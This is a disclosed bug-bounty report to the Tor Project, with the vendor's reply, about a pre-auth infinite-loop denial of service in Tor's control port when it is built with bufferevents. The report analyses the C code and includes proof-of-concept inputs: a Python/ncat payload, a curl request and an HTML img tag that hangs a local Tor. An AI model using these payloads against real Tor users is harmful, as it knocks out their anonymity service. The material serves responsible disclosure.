{"id":113424,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTM0MjQ=","url":"https://hackerone.com/reports/113424","title":"[tor] control connection pre-auth DoS (infinite loop) with --enable-bufferevents","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-29T05:43:35.625Z","submitted_at":"2016-01-29T05:43:35.625Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"guido","url":"/guido","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1800,"url":"https://hackerone.com/torproject","handle":"torproject","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Tor","twitter_handle":"torproject","website":"https://www.torproject.org/","about":"Anonymity Online"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-10-19T10:15:36.573Z","bug_reporter_agreed_on_going_public_at":"2017-10-19T10:15:36.485Z","team_member_agreed_on_going_public_at":"2017-10-19T09:38:21.219Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In control.c, this is the loop that retrieves data from the input buffer of the connection, or returns if no complete linefreed-terminated line is available (connection_fetch_from_buf_line() returns 0).\n\n```c\n4225   while (1) {\n4226     size_t last_idx;\n4227     int r;\n4228     /* First, fetch a line. */\n4229     do {\n4230       data_len = conn-\u003eincoming_cmd_len - conn-\u003eincoming_cmd_cur_len;\n4231       r = connection_fetch_from_buf_line(TO_CONN(conn),\n4232                               conn-\u003eincoming_cmd+conn-\u003eincoming_cmd_cur_len,\n4233                               \u0026data_len);\n4234       if (r == 0)\n4235         /* Line not all here yet. Wait. */\n4236         return 0;\n4237       else if (r == -1) {\n4238         if (data_len + conn-\u003eincoming_cmd_cur_len \u003e MAX_COMMAND_LINE_LENGTH) {\n4239           connection_write_str_to_buf(\"500 Line too long.\\r\\n\", conn);\n4240           connection_stop_reading(TO_CONN(conn));\n4241           connection_mark_and_flush(TO_CONN(conn));\n4242         }\n4243         while (conn-\u003eincoming_cmd_len \u003c data_len+conn-\u003eincoming_cmd_cur_len)\n4244           conn-\u003eincoming_cmd_len *= 2;\n4245         conn-\u003eincoming_cmd = tor_realloc(conn-\u003eincoming_cmd,\n4246                                          conn-\u003eincoming_cmd_len);\n4247       }\n4248     } while (r != 1);\n```\n\nIf connection_fetch_from_buf_line() returns -1, this means that the buffer (conn-\u003eincoming_cmd) is not large enough. conn-\u003eincoming_cmd_len is then increased to a size sufficiently large to hold the incoming command (lines 4243 - 4246). In order for this to work, data_len must be set to this required size by connection_fetch_from_buf_line().\n\nIf libevent bufferevents are not enabled, then connection_fetch_from_buf_line() is simply a proxy function for fetch_from_buf_line():\n\n```c\n3785   }) ELSE_IF_NO_BUFFEREVENT {\n3786     return fetch_from_buf_line(conn-\u003einbuf, data, data_len);\n3787   } \n```\n\nThis function will indeed set *data_len to the required size if the present buffer size is too small (line 2255):\n\n```c\n2241 int\n2242 fetch_from_buf_line(buf_t *buf, char *data_out, size_t *data_len)\n2243 {\n2244   size_t sz;\n2245   off_t offset;\n2246 \n2247   if (!buf-\u003ehead)\n2248     return 0;\n2249     \n2250   offset = buf_find_offset_of_char(buf, '\\n');\n2251   if (offset \u003c 0)\n2252     return 0;\n2253   sz = (size_t) offset;\n2254   if (sz+2 \u003e *data_len) {\n2255     *data_len = sz + 2;\n2256     return -1;\n2257   } \n2258   fetch_from_buf(data_out, sz+1, buf);   \n2259   data_out[sz+1] = '\\0';\n2260   *data_len = sz+1; \n2261   return 1;\n2262 }   \n```\n\nHowever, if libevent bufferevents are enabled (by ./configuring tor with --enable-bufferevents), then the code on lines (3770 - 3784) is executed instead:\n\n```c\n3765 int \n3766 connection_fetch_from_buf_line(connection_t *conn, char *data,\n3767                                size_t *data_len)\n3768 {   \n3769   IF_HAS_BUFFEREVENT(conn, {\n3770     int r;\n3771     size_t eol_len=0;\n3772     struct evbuffer *input = bufferevent_get_input(conn-\u003ebufev);\n3773     struct evbuffer_ptr ptr =\n3774       evbuffer_search_eol(input, NULL, \u0026eol_len, EVBUFFER_EOL_LF);\n3775     if (ptr.pos == -1)\n3776       return 0; /* No EOL found. */\n3777     if ((size_t)ptr.pos+eol_len \u003e= *data_len) {\n3778       return -1; /* Too long */\n3779     }     \n3780     *data_len = ptr.pos+eol_len;\n3781     r = evbuffer_remove(input, data, ptr.pos+eol_len);\n3782     tor_assert(r \u003e= 0);\n3783     data[ptr.pos+eol_len] = '\\0';\n3784     return 1;\n3785   }) ELSE_IF_NO_BUFFEREVENT {            \n3786     return fetch_from_buf_line(conn-\u003einbuf, data, data_len);\n3787   }\n3788 }\n```\n\nFollowing the size check on line 3777, *data_len is not altered and thus remains the same as before the invocation.\n\nFor incoming data larger than the initial buffer size (1024 bytes) and contains a linefeed character past 1024 bytes, this sends the control connection input routine into an infinite loop.\n\n# Proof of concept\n$ ./configure --enable-bufferevents \u0026\u0026 make -j4\n\nNow start tor with this torrc:\n\nControlPort 9999\n\nthen in another terminal:\n\n$ cat genpoc.py \nimport sys\nsys.stdout.write((chr(0x63) * 2000) + chr(0x0A) )\n\n$ python genpoc.py \u003epoc\n$ ncat localhost 9999 \u003cpoc\n\ntor now hangs and has to be killed with force (kill -9 \u003cpid\u003e).\n\n#Inter-protocol exploit\n\nSince the only two prerequisites of the attack are:\n\n- Input longer than 1024 bytes\n- Input contains linefeed character after byte 1024\n\nit's easy to think of other ways of making tor hang than manually creating a connection for this purpose.\n\n```\n$ cat genpoc2.py \nprint \"curl http://localhost:9999/{}\".format(\"x\" * 1200)\n$ python genpoc2.py \u003epoc.sh\n$ bash poc.sh\n```\n\nThis also causes tor to hang, because curl is sending this to tor:\n\n````\nGET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: localhost:9999\nAccept: */*\n\n```\n\nwhich is data that adheres to the prerequisites.\n\nThus, a person running tor with the control server running locally while also using a regular browser can be DoSed via:\n\n```html\n\u003cimg src='http://localhost:9999/xxxxxxxxxxxxxxxxxxx...'\u003e\n```\n\nGuido","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-11-18T09:38:21.280Z","allow_singular_disclosure_after":-122960933.3091522,"singular_disclosure_allowed":true,"vote_count":5,"voters":["geeknik","eveeez","mr_r3boot","spetr0x","b4155f7c29acd42c27d007a"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":777132,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hello there,\n\nthanks for the bug report. We consider this issue to not be serious enough to fit in our program. However, the report is nicely written and we appreciate you looking out for more bugs, so here is $100.\n\nFWIW, we consider bufferevents to be a very experimental feature that is not to be enabled in production. We even print a scary warning in the beginning if the person enables it. We should maybe consider being more aggressive in warning people about bufferevents.\n\nAlso, local DoS vulnerabilities are not something we handle as part of this program.\n\nThanks for the report anyway, and keep on bringing good bugs!\n\n","automated_response":false,"created_at":"2016-01-29T17:36:10.233Z","updated_at":"2016-01-29T17:36:10.233Z","actor":{"url":"/torproject","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Tor"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"torproject","collaborator":{"username":"guido","url":"/guido"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":777148,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks. This has been filed as https://trac.torproject.org/projects/tor/ticket/18189","automated_response":false,"created_at":"2016-01-29T17:42:02.966Z","updated_at":"2016-01-29T17:42:02.966Z","actor":{"username":"asn","cleared":false,"url":"/asn","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1006331,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Feel free to mark this one as resolved as well when you are ready :).","automated_response":false,"created_at":"2016-06-09T11:24:22.143Z","updated_at":"2016-06-09T11:24:22.143Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1006471,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-06-09T13:44:47.556Z","updated_at":"2016-06-09T13:44:47.556Z","actor":{"username":"asn","cleared":false,"url":"/asn","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"guido","url":"/guido"},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2083674,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-10-19T09:38:21.247Z","updated_at":"2017-10-19T09:38:21.247Z","first_to_agree":true,"actor":{"username":"geko","cleared":false,"url":"/geko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2083737,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-10-19T10:15:36.537Z","updated_at":"2017-10-19T10:15:36.537Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2083738,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-10-19T10:15:36.593Z","updated_at":"2017-10-19T10:15:36.593Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}